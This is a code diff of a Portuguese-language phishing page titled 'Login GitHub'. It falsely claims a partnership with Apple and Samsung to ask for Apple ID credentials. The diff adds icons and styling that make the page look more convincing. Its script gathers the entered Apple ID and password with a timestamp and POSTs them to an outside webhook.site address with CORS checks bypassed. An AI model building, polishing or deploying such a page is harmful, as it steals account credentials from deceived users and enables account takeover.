@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Login GitHub</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
@@ -13,6 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            flex-direction: column;
         }
         .login-container {
             background: white;
@@ -54,19 +56,48 @@
             margin-top: -10px;
             margin-bottom: 15px;
         }
+        .icon-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 10px;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        .footer-icons {
+            margin-top: 20px;
+            display: flex;
+            gap: 30px;
+            font-size: 24px;
+            color: #333;
+            justify-content: center;
+        }
     </style>
 </head>
 <body>
     <div class="login-container">
         <div class="apple-logo"></div>
         <h2>Fazer login</h2>
-        <p>Faça login para ter acesso ao GitHub.</p>
-        <p>Caso não tenha cadastro no GitHub, é possível acessar com sua conta iCloud ou Samsung Members.</p>
+        <div class="icon-text">
+            <i class="fab fa-github"></i>
+            <span>Faça login para ter acesso ao GitHub.</span>
+        </div>
+        <p>
+            Caso não tenha cadastro no GitHub, é possível acessar com sua conta iCloud ou Samsung Members,
+            graças à nossa parceria com a Apple e a Samsung.
+        </p>
         <form id="loginForm">
             <input type="text" id="apple_id" name="apple_id" placeholder="Apple ID" required>
             <input type="password" id="password" name="password" placeholder="Senha" required>
             <button type="submit">Continuar</button>
         </form>
+    </div>
+
+    <!-- Rodapé com ícones -->
+    <div class="footer-icons">
+        <i class="fab fa-apple"></i>
+        <i class="fab fa-samsung"></i>
     </div>
 
     <script>
@@ -82,7 +113,7 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Envio sem verificação de CORS (dados chegam, mas sem retorno)
+            // Envio sem verificação de CORS
             fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
                 method: 'POST',
                 mode: 'no-cors',
